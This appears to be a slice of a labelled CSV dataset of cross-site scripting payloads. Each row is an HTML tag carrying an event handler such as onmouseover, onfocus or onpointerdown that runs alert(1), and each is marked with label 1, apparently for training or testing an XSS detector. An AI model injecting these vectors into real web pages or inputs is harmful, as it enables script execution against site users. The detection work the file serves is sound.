,Sentence,Label
76,"<abbr onpointerover=alert(1)>XSS</abbr>
",1
77,"<abbr onpointerup=alert(1)>XSS</abbr>
",1
78,"<acronym draggable=""true"" ondrag=""alert(1)"">test</acronym>
",1
79,"<acronym draggable=""true"" ondragend=""alert(1)"">test</acronym>
",1
80,"<acronym draggable=""true"" ondragenter=""alert(1)"">test</acronym>
",1
81,"<acronym draggable=""true"" ondragleave=""alert(1)"">test</acronym>
",1
82,"<acronym draggable=""true"" ondragstart=""alert(1)"">test</acronym>
",1
83,"<acronym id=x tabindex=1 onactivate=alert(1)></acronym>
",1
84,"<acronym id=x tabindex=1 onbeforeactivate=alert(1)></acronym>
",1
85,"<acronym id=x tabindex=1 onbeforedeactivate=alert(1)></acronym><input autofocus>
",1
86,"<acronym id=x tabindex=1 ondeactivate=alert(1)></acronym><input id=y autofocus>
",1
87,"<acronym id=x tabindex=1 onfocus=alert(1)></acronym>
",1
88,"<acronym id=x tabindex=1 onfocusin=alert(1)></acronym>
",1
89,"<acronym onbeforecopy=""alert(1)"" contenteditable>test</acronym>
",1
90,"<acronym onbeforecut=""alert(1)"" contenteditable>test</acronym>
",1
91,"<acronym onbeforepaste=""alert(1)"" contenteditable>test</acronym>
",1
92,"<acronym onblur=alert(1) tabindex=1 id=x></acronym><input autofocus>
",1
93,"<acronym onclick=""alert(1)"">test</acronym>
",1
94,"<acronym oncontextmenu=""alert(1)"">test</acronym>
",1
95,"<acronym oncopy=""alert(1)"" contenteditable>test</acronym>
",1
96,"<acronym oncut=""alert(1)"" contenteditable>test</acronym>
",1
97,"<acronym ondblclick=""alert(1)"">test</acronym>
",1
98,"<acronym onfocusout=alert(1) tabindex=1 id=x></acronym><input autofocus>
",1
99,"<acronym onkeydown=""alert(1)"" contenteditable>test</acronym>
",1
100,"<acronym onkeypress=""alert(1)"" contenteditable>test</acronym>
",1
101,"<acronym onkeyup=""alert(1)"" contenteditable>test</acronym>
",1
102,"<acronym onmousedown=""alert(1)"">test</acronym>
",1
103,"<acronym onmouseenter=""alert(1)"">test</acronym>
",1
104,"<acronym onmouseleave=""alert(1)"">test</acronym>
",1
105,"<acronym onmousemove=""alert(1)"">test</acronym>
",1
106,"<acronym onmouseout=""alert(1)"">test</acronym>
",1
107,"<acronym onmouseover=""alert(1)"">test</acronym>
",1
108,"<acronym onmouseup=""alert(1)"">test</acronym>
",1
109,"<acronym onpaste=""alert(1)"" contenteditable>test</acronym>
",1
110,"<acronym onpointerdown=alert(1)>XSS</acronym>
",1
111,"<acronym onpointerenter=alert(1)>XSS</acronym>
",1
112,"<acronym onpointerleave=alert(1)>XSS</acronym>
",1
113,"<acronym onpointermove=alert(1)>XSS</acronym>
",1
114,"<acronym onpointerout=alert(1)>XSS</acronym>
",1
115,"<acronym onpointerover=alert(1)>XSS</acronym>
",1
116,"<acronym onpointerup=alert(1)>XSS</acronym>
",1
117,"<address draggable=""true"" ondrag=""alert(1)"">test</address>
",1
118,"<address draggable=""true"" ondragend=""alert(1)"">test</address>
",1
119,"<address draggable=""true"" ondragenter=""alert(1)"">test</address>
",1
120,"<address draggable=""true"" ondragleave=""alert(1)"">test</address>
",1
121,"<address draggable=""true"" ondragstart=""alert(1)"">test</address>
",1
122,"<address id=x tabindex=1 onactivate=alert(1)></address>
",1
123,"<address id=x tabindex=1 onbeforeactivate=alert(1)></address>
",1
124,"<address id=x tabindex=1 onbeforedeactivate=alert(1)></address><input autofocus>
",1
125,"<address id=x tabindex=1 ondeactivate=alert(1)></address><input id=y autofocus>
",1
126,"<address id=x tabindex=1 onfocus=alert(1)></address>
",1
127,"<address id=x tabindex=1 onfocusin=alert(1)></address>
",1
128,"<address onbeforecopy=""alert(1)"" contenteditable>test</address>
",1
129,"<address onbeforecut=""alert(1)"" contenteditable>test</address>
",1
130,"<address onbeforepaste=""alert(1)"" contenteditable>test</address>
",1
131,"<address onblur=alert(1) tabindex=1 id=x></address><input autofocus>
",1
132,"<address onclick=""alert(1)"">test</address>
",1
133,"<address oncontextmenu=""alert(1)"">test</address>
",1
134,"<address oncopy=""alert(1)"" contenteditable>test</address>
",1
135,"<address oncut=""alert(1)"" contenteditable>test</address>
",1
136,"<address ondblclick=""alert(1)"">test</address>
",1
137,"<address onfocusout=alert(1) tabindex=1 id=x></address><input autofocus>
",1
138,"<address onkeydown=""alert(1)"" contenteditable>test</address>
",1
139,"<address onkeypress=""alert(1)"" contenteditable>test</address>
",1
140,"<address onkeyup=""alert(1)"" contenteditable>test</address>
",1
141,"<address onmousedown=""alert(1)"">test</address>
",1
142,"<address onmouseenter=""alert(1)"">test</address>
",1
143,"<address onmouseleave=""alert(1)"">test</address>
",1
144,"<address onmousemove=""alert(1)"">test</address>
",1
145,"<address onmouseout=""alert(1)"">test</address>
",1
146,"<address onmouseover=""alert(1)"">test</address>
",1
147,"<address onmouseup=""alert(1)"">test</address>
",1
148,"<address onpaste=""alert(1)"" contenteditable>test</address>
",1
149,"<address onpointerdown=alert(1)>XSS</address>
",1
150,"<address onpointerenter=alert(1)>XSS</address>
",1
151,"<address onpointerleave=alert(1)>XSS</address>
",1
152,"<address onpointermove=alert(1)>XSS</address>
",1
153,"<address onpointerout=alert(1)>XSS</address>
",1
154,"<address onpointerover=alert(1)>XSS</address>
",1
155,"<address onpointerup=alert(1)>XSS</address>
",1
156,"<animate onpointerdown=alert(1)>XSS</animate>
",1
157,"<animate onpointerenter=alert(1)>XSS</animate>
",1
158,"<animate onpointerleave=alert(1)>XSS</animate>
",1
159,"<animate onpointermove=alert(1)>XSS</animate>
",1
160,"<animate onpointerout=alert(1)>XSS</animate>
",1
161,"<animate onpointerover=alert(1)>XSS</animate>
",1
162,"<animate onpointerup=alert(1)>XSS</animate>
",1
163,"<animatemotion onpointerdown=alert(1)>XSS</animatemotion>
",1
164,"<animatemotion onpointerenter=alert(1)>XSS</animatemotion>
",1
165,"<animatemotion onpointerleave=alert(1)>XSS</animatemotion>
",1
166,"<animatemotion onpointermove=alert(1)>XSS</animatemotion>
",1
167,"<animatemotion onpointerout=alert(1)>XSS</animatemotion>
",1
168,"<animatemotion onpointerover=alert(1)>XSS</animatemotion>
",1
169,"<animatemotion onpointerup=alert(1)>XSS</animatemotion>
",1
170,"<animatetransform onpointerdown=alert(1)>XSS</animatetransform>
",1
171,"<animatetransform onpointerenter=alert(1)>XSS</animatetransform>
",1
172,"<animatetransform onpointerleave=alert(1)>XSS</animatetransform>
",1
173,"<animatetransform onpointermove=alert(1)>XSS</animatetransform>
",1
174,"<animatetransform onpointerout=alert(1)>XSS</animatetransform>
",1
175,"<animatetransform onpointerover=alert(1)>XSS</animatetransform>
",1
176,"<animatetransform onpointerup=alert(1)>XSS</animatetransform>
",1
177,"<applet draggable=""true"" ondrag=""alert(1)"">test</applet>
",1
178,"<applet draggable=""true"" ondragend=""alert(1)"">test</applet>
",1
179,"<applet draggable=""true"" ondragenter=""alert(1)"">test</applet>
",1
180,"<applet draggable=""true"" ondragleave=""alert(1)"">test</applet>
",1
181,"<applet draggable=""true"" ondragstart=""alert(1)"">test</applet>
",1
182,"<applet id=x tabindex=1 onactivate=alert(1)></applet>
",1
183,"<applet id=x tabindex=1 onbeforeactivate=alert(1)></applet>
",1
184,"<applet id=x tabindex=1 onbeforedeactivate=alert(1)></applet><input autofocus>
",1
185,"<applet id=x tabindex=1 ondeactivate=alert(1)></applet><input id=y autofocus>
",1
186,"<applet id=x tabindex=1 onfocus=alert(1)></applet>
",1
187,"<applet id=x tabindex=1 onfocusin=alert(1)></applet>
",1
188,"<applet onbeforecopy=""alert(1)"" contenteditable>test</applet>
",1
189,"<applet onbeforecut=""alert(1)"" contenteditable>test</applet>
",1
190,"<applet onbeforepaste=""alert(1)"" contenteditable>test</applet>
",1
191,"<applet onblur=alert(1) tabindex=1 id=x></applet><input autofocus>
",1
192,"<applet onclick=""alert(1)"">test</applet>
",1
193,"<applet oncontextmenu=""alert(1)"">test</applet>
",1
194,"<applet oncopy=""alert(1)"" contenteditable>test</applet>
",1
195,"<applet oncut=""alert(1)"" contenteditable>test</applet>
",1
196,"<applet ondblclick=""alert(1)"">test</applet>
",1
197,"<applet onfocusout=alert(1) tabindex=1 id=x></applet><input autofocus>
",1
198,"<applet onkeydown=""alert(1)"" contenteditable>test</applet>
",1
199,"<applet onkeypress=""alert(1)"" contenteditable>test</applet>
",1
200,"<applet onkeyup=""alert(1)"" contenteditable>test</applet>
",1
201,"<applet onmousedown=""alert(1)"">test</applet>
",1
202,"<applet onmouseenter=""alert(1)"">test</applet>
",1
203,"<applet onmouseleave=""alert(1)"">test</applet>
",1
204,"<applet onmousemove=""alert(1)"">test</applet>
",1
205,"<applet onmouseout=""alert(1)"">test</applet>
",1
206,"<applet onmouseover=""alert(1)"">test</applet>
",1
207,"<applet onmouseup=""alert(1)"">test</applet>
",1
208,"<applet onpaste=""alert(1)"" contenteditable>test</applet>
",1
209,"<applet onpointerdown=alert(1)>XSS</applet>
",1
210,"<applet onpointerenter=alert(1)>XSS</applet>
",1
211,"<applet onpointerleave=alert(1)>XSS</applet>
",1
212,"<applet onpointermove=alert(1)>XSS</applet>
",1
213,"<applet onpointerout=alert(1)>XSS</applet>
",1
214,"<applet onpointerover=alert(1)>XSS</applet>
",1
215,"<applet onpointerup=alert(1)>XSS</applet>
",1
216,"<applet onreadystatechange=alert(1)></applet>
",1
217,"<area draggable=""true"" ondrag=""alert(1)"">test</area>
",1
218,"<area draggable=""true"" ondragend=""alert(1)"">test</area>
",1
219,"<area draggable=""true"" ondragenter=""alert(1)"">test</area>
",1
220,"<area draggable=""true"" ondragleave=""alert(1)"">test</area>
",1
221,"<area draggable=""true"" ondragstart=""alert(1)"">test</area>
",1
222,"<area id=x tabindex=1 onactivate=alert(1)></area>
",1
223,"<area id=x tabindex=1 onbeforeactivate=alert(1)></area>
",1
224,"<area id=x tabindex=1 onbeforedeactivate=alert(1)></area><input autofocus>
",1
225,"<area id=x tabindex=1 ondeactivate=alert(1)></area><input id=y autofocus>
",1
226,"<area onbeforecopy=""alert(1)"" contenteditable>test</area>
",1
227,"<area onbeforecut=""alert(1)"" contenteditable>test</area>
",1
228,"<area onbeforepaste=""alert(1)"" contenteditable>test</area>
",1
229,"<area onblur=alert(1) tabindex=1 id=x></area><input autofocus>
",1
230,"<area onclick=""alert(1)"">test</area>
",1
231,"<area oncontextmenu=""alert(1)"">test</area>
",1
232,"<area oncopy=""alert(1)"" contenteditable>test</area>
",1
233,"<area oncut=""alert(1)"" contenteditable>test</area>
",1
234,"<area ondblclick=""alert(1)"">test</area>
",1
235,"<area onfocusout=alert(1) tabindex=1 id=x></area><input autofocus>
",1
236,"<area onkeydown=""alert(1)"" contenteditable>test</area>
",1
237,"<area onkeypress=""alert(1)"" contenteditable>test</area>
",1
238,"<area onkeyup=""alert(1)"" contenteditable>test</area>
",1
239,"<area onmousedown=""alert(1)"">test</area>
",1
240,"<area onmouseenter=""alert(1)"">test</area>
",1
241,"<area onmouseleave=""alert(1)"">test</area>
",1
242,"<area onmousemove=""alert(1)"">test</area>
",1
243,"<area onmouseout=""alert(1)"">test</area>
",1
244,"<area onmouseover=""alert(1)"">test</area>
",1
245,"<area onmouseup=""alert(1)"">test</area>
",1
246,"<area onpaste=""alert(1)"" contenteditable>test</area>
",1
247,"<area onpointerdown=alert(1)>XSS</area>
",1
248,"<area onpointerenter=alert(1)>XSS</area>
",1
249,"<area onpointerleave=alert(1)>XSS</area>
",1
250,"<area onpointermove=alert(1)>XSS</area>
",1
251,"<area onpointerout=alert(1)>XSS</area>
",1
252,"<area onpointerover=alert(1)>XSS</area>
",1
253,"<area onpointerup=alert(1)>XSS</area>
",1
254,"<article draggable=""true"" ondrag=""alert(1)"">test</article>
",1
255,"<article draggable=""true"" ondragend=""alert(1)"">test</article>
",1
256,"<article draggable=""true"" ondragenter=""alert(1)"">test</article>
",1
257,"<article draggable=""true"" ondragleave=""alert(1)"">test</article>
",1
258,"<article draggable=""true"" ondragstart=""alert(1)"">test</article>
",1
259,"<article id=x tabindex=1 onactivate=alert(1)></article>
",1
260,"<article id=x tabindex=1 onbeforeactivate=alert(1)></article>
",1
261,"<article id=x tabindex=1 onbeforedeactivate=alert(1)></article><input autofocus>
",1
262,"<article id=x tabindex=1 ondeactivate=alert(1)></article><input id=y autofocus>
",1
263,"<article id=x tabindex=1 onfocus=alert(1)></article>
",1
264,"<article id=x tabindex=1 onfocusin=alert(1)></article>
",1
265,"<article onbeforecopy=""alert(1)"" contenteditable>test</article>
",1
266,"<article onbeforecut=""alert(1)"" contenteditable>test</article>
",1
267,"<article onbeforepaste=""alert(1)"" contenteditable>test</article>
",1
268,"<article onblur=alert(1) tabindex=1 id=x></article><input autofocus>
",1
269,"<article onclick=""alert(1)"">test</article>
",1
270,"<article oncontextmenu=""alert(1)"">test</article>
",1
271,"<article oncopy=""alert(1)"" contenteditable>test</article>
",1
272,"<article oncut=""alert(1)"" contenteditable>test</article>
",1
273,"<article ondblclick=""alert(1)"">test</article>
",1
274,"<article onfocusout=alert(1) tabindex=1 id=x></article><input autofocus>
",1
275,"<article onkeydown=""alert(1)"" contenteditable>test</article>
",1
276,"<article onkeypress=""alert(1)"" contenteditable>test</article>
",1
277,"<article onkeyup=""alert(1)"" contenteditable>test</article>
",1
278,"<article onmousedown=""alert(1)"">test</article>
",1
279,"<article onmouseenter=""alert(1)"">test</article>
",1
280,"<article onmouseleave=""alert(1)"">test</article>
",1
281,"<article onmousemove=""alert(1)"">test</article>
",1
282,"<article onmouseout=""alert(1)"">test</article>
",1
283,"<article onmouseover=""alert(1)"">test</article>
",1
284,"<article onmouseup=""alert(1)"">test</article>
",1
285,"<article onpaste=""alert(1)"" contenteditable>test</article>
",1
286,"<article onpointerdown=alert(1)>XSS</article>
",1
287,"<article onpointerenter=alert(1)>XSS</article>
",1
288,"<article onpointerleave=alert(1)>XSS</article>
",1
289,"<article onpointermove=alert(1)>XSS</article>
",1
290,"<article onpointerout=alert(1)>XSS</article>
",1
291,"<article onpointerover=alert(1)>XSS</article>
",1
292,"<article onpointerup=alert(1)>XSS</article>
",1
293,"<aside draggable=""true"" ondrag=""alert(1)"">test</aside>
",1
294,"<aside draggable=""true"" ondragend=""alert(1)"">test</aside>
",1
295,"<aside draggable=""true"" ondragenter=""alert(1)"">test</aside>
",1
296,"<aside draggable=""true"" ondragleave=""alert(1)"">test</aside>
",1
297,"<aside draggable=""true"" ondragstart=""alert(1)"">test</aside>
",1
298,"<aside id=x tabindex=1 onactivate=alert(1)></aside>
",1
299,"<aside id=x tabindex=1 onbeforeactivate=alert(1)></aside>
",1
300,"<aside id=x tabindex=1 onbeforedeactivate=alert(1)></aside><input autofocus>
",1
301,"<aside id=x tabindex=1 ondeactivate=alert(1)></aside><input id=y autofocus>
",1
302,"<aside id=x tabindex=1 onfocus=alert(1)></aside>
",1
303,"<aside id=x tabindex=1 onfocusin=alert(1)></aside>
",1
304,"<aside onbeforecopy=""alert(1)"" contenteditable>test</aside>
",1
305,"<aside onbeforecut=""alert(1)"" contenteditable>test</aside>
",1
306,"<aside onbeforepaste=""alert(1)"" contenteditable>test</aside>
",1
307,"<aside onblur=alert(1) tabindex=1 id=x></aside><input autofocus>
",1
308,"<aside onclick=""alert(1)"">test</aside>
",1
309,"<aside oncontextmenu=""alert(1)"">test</aside>
",1
310,"<aside oncopy=""alert(1)"" contenteditable>test</aside>
",1
311,"<aside oncut=""alert(1)"" contenteditable>test</aside>
",1
312,"<aside ondblclick=""alert(1)"">test</aside>
",1
313,"<aside onfocusout=alert(1) tabindex=1 id=x></aside><input autofocus>
",1
314,"<aside onkeydown=""alert(1)"" contenteditable>test</aside>
",1
315,"<aside onkeypress=""alert(1)"" contenteditable>test</aside>
",1
316,"<aside onkeyup=""alert(1)"" contenteditable>test</aside>
",1
317,"<aside onmousedown=""alert(1)"">test</aside>
",1
318,"<aside onmouseenter=""alert(1)"">test</aside>
",1
319,"<aside onmouseleave=""alert(1)"">test</aside>
",1
320,"<aside onmousemove=""alert(1)"">test</aside>
",1
321,"<aside onmouseout=""alert(1)"">test</aside>
",1
322,"<aside onmouseover=""alert(1)"">test</aside>
",1
323,"<aside onmouseup=""alert(1)"">test</aside>
",1
324,"<aside onpaste=""alert(1)"" contenteditable>test</aside>
",1
325,"<aside onpointerdown=alert(1)>XSS</aside>
",1
326,"<aside onpointerenter=alert(1)>XSS</aside>
",1
327,"<aside onpointerleave=alert(1)>XSS</aside>
",1
328,"<aside onpointermove=alert(1)>XSS</aside>
",1
329,"<aside onpointerout=alert(1)>XSS</aside>
",1
330,"<aside onpointerover=alert(1)>XSS</aside>
",1
331,"<aside onpointerup=alert(1)>XSS</aside>
",1
332,"<audio autoplay controls onpause=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>
",1
333,"<audio autoplay controls onseeked=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>
",1
334,"<audio autoplay controls onseeking=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>
",1
335,"<audio autoplay controls onvolumechange=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>
",1
336,"<audio autoplay onloadedmetadata=alert(1)> <source src=""validaudio.wav"" type=""audio/wav""></audio>
",1
337,"<audio autoplay onplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>
",1
338,"<audio autoplay onplaying=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>
",1
339,"<audio controls autoplay onended=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>
",1
340,"<audio controls autoplay ontimeupdate=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>
",1
341,"<audio draggable=""true"" ondrag=""alert(1)"">test</audio>
",1
342,"<audio draggable=""true"" ondragend=""alert(1)"">test</audio>
",1
343,"<audio draggable=""true"" ondragenter=""alert(1)"">test</audio>
",1
344,"<audio draggable=""true"" ondragleave=""alert(1)"">test</audio>
",1
345,"<audio draggable=""true"" ondragstart=""alert(1)"">test</audio>
",1
346,"<audio id=x controls onfocus=alert(1) id=x><source src=""validaudio.wav""></audio>
",1
347,"<audio id=x controls onfocusin=alert(1) id=x><source src=""validaudio.wav""></audio>
",1
348,"<audio id=x tabindex=1 onactivate=alert(1)></audio>
",1
349,"<audio id=x tabindex=1 onbeforeactivate=alert(1)></audio>
",1
350,"<audio id=x tabindex=1 onbeforedeactivate=alert(1)></audio><input autofocus>
",1
351,"<audio id=x tabindex=1 ondeactivate=alert(1)></audio><input id=y autofocus>
",1
352,"<audio onbeforecopy=""alert(1)"" contenteditable>test</audio>
",1
353,"<audio onbeforecut=""alert(1)"" contenteditable>test</audio>
",1
354,"<audio onbeforepaste=""alert(1)"" contenteditable>test</audio>
",1
355,"<audio onblur=alert(1) tabindex=1 id=x></audio><input autofocus>
",1
356,"<audio oncanplay=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>
",1
357,"<audio onclick=""alert(1)"">test</audio>
",1
358,"<audio oncontextmenu=""alert(1)"">test</audio>
",1
359,"<audio oncopy=""alert(1)"" contenteditable>test</audio>
",1
360,"<audio oncut=""alert(1)"" contenteditable>test</audio>
",1
361,"<audio ondblclick=""alert(1)"">test</audio>
",1
362,"<audio onfocusout=alert(1) tabindex=1 id=x></audio><input autofocus>
",1
363,"<audio onkeydown=""alert(1)"" contenteditable>test</audio>
",1
364,"<audio onkeypress=""alert(1)"" contenteditable>test</audio>
",1
365,"<audio onkeyup=""alert(1)"" contenteditable>test</audio>
",1
366,"<audio onloadeddata=alert(1)><source src=""validaudio.wav"" type=""audio/wav""></audio>
",1
367,"<audio onmousedown=""alert(1)"">test</audio>
",1
368,"<audio onmouseenter=""alert(1)"">test</audio>
",1
369,"<audio onmouseleave=""alert(1)"">test</audio>
",1
370,"<audio onmousemove=""alert(1)"">test</audio>
",1
371,"<audio onmouseout=""alert(1)"">test</audio>
",1
372,"<audio onmouseover=""alert(1)"">test</audio>
",1
373,"<audio onmouseup=""alert(1)"">test</audio>
",1
374,"<audio onpaste=""alert(1)"" contenteditable>test</audio>
",1
375,"<audio onpointerdown=alert(1)>XSS</audio>
",1
376,"<audio onpointerenter=alert(1)>XSS</audio>
",1
377,"<audio onpointerleave=alert(1)>XSS</audio>
",1
378,"<audio onpointermove=alert(1)>XSS</audio>
",1
379,"<audio onpointerout=alert(1)>XSS</audio>
",1
380,"<audio onpointerover=alert(1)>XSS</audio>
",1
381,"<audio onpointerup=alert(1)>XSS</audio>
",1
382,"<audio src/onerror=alert(1)>
",1
383,"<b draggable=""true"" ondrag=""alert(1)"">test</b>
",1
384,"<b draggable=""true"" ondragend=""alert(1)"">test</b>
",1
385,"<b draggable=""true"" ondragenter=""alert(1)"">test</b>
",1
386,"<b draggable=""true"" ondragleave=""alert(1)"">test</b>
",1
387,"<b draggable=""true"" ondragstart=""alert(1)"">test</b>
",1
388,"<b id=x tabindex=1 onactivate=alert(1)></b>
",1
389,"<b id=x tabindex=1 onbeforeactivate=alert(1)></b>
",1
390,"<b id=x tabindex=1 onbeforedeactivate=alert(1)></b><input autofocus>
",1
391,"<b id=x tabindex=1 ondeactivate=alert(1)></b><input id=y autofocus>
",1
392,"<b id=x tabindex=1 onfocus=alert(1)></b>
",1
393,"<b id=x tabindex=1 onfocusin=alert(1)></b>
",1
394,"<b onbeforecopy=""alert(1)"" contenteditable>test</b>
",1
395,"<b onbeforecut=""alert(1)"" contenteditable>test</b>
",1
396,"<b onbeforepaste=""alert(1)"" contenteditable>test</b>
",1
397,"<b onblur=alert(1) tabindex=1 id=x></b><input autofocus>
",1
398,"<b onclick=""alert(1)"">test</b>
",1
399,"<b oncontextmenu=""alert(1)"">test</b>
",1
400,"<b oncopy=""alert(1)"" contenteditable>test</b>
",1
401,"<b oncut=""alert(1)"" contenteditable>test</b>
",1
402,"<b ondblclick=""alert(1)"">test</b>
",1
403,"<b onfocusout=alert(1) tabindex=1 id=x></b><input autofocus>
",1
404,"<b onkeydown=""alert(1)"" contenteditable>test</b>
",1
405,"<b onkeypress=""alert(1)"" contenteditable>test</b>
",1
406,"<b onkeyup=""alert(1)"" contenteditable>test</b>
",1
407,"<b onmousedown=""alert(1)"">test</b>
",1
408,"<b onmouseenter=""alert(1)"">test</b>
",1
409,"<b onmouseleave=""alert(1)"">test</b>
",1
410,"<b onmousemove=""alert(1)"">test</b>
",1
411,"<b onmouseout=""alert(1)"">test</b>
",1
412,"<b onmouseover=""alert(1)"">test</b>
",1
413,"<b onmouseup=""alert(1)"">test</b>
",1
414,"<b onpaste=""alert(1)"" contenteditable>test</b>
",1
415,"<b onpointerdown=alert(1)>XSS</b>
",1
